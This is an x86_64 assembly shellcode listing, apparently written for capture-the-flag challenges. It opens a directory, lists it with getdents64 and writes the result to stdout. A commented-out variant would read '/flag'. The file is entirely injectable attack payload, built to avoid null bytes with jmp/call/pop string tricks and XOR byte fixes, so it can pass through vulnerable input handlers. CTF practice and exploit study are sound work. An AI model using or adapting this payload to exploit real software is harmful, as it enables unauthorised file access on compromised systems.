BITS 64
; Author Rinzler - l33t1m Team
; ls . & cat /flag Linux x86_64 Shellcode
; ls shellcode size 58 bytes
; cat shellcode size 58 bytes
global _start


_start:
	jmp _push_filename

_readfile:
	; syscall open
	pop rdi
	xor byte [rdi + 1], 0x41	; last byte fix
	push 2
	pop rax
	xor esi, esi
	syscall

	; syscall getdents64 with path: db ".A"
	sub sp, 0xfff
	push rax
	pop rdi
	cdq
	mov dx, 0x8001
	dec edx
	xor eax, eax
	mov al, 0xd9
	push rsp
	pop rsi
	syscall

	; ; syscall read with path: db "/flagA"
	; sub sp, 0xfff
	; push rsp
	; pop rsi
	; push rax
	; pop rdi
	; cdq
	; mov dx, 0xfff	; size to read
	; xor eax, eax
	; syscall

	; syscall write
	push 1
	pop rdi	; set stdout fd = 1
	push rax
	pop rdx
	push 1
	pop rax
	syscall

	; syscall exit
	push 60
	pop rax
	syscall

_push_filename:
	call _readfile
	path: db ".A"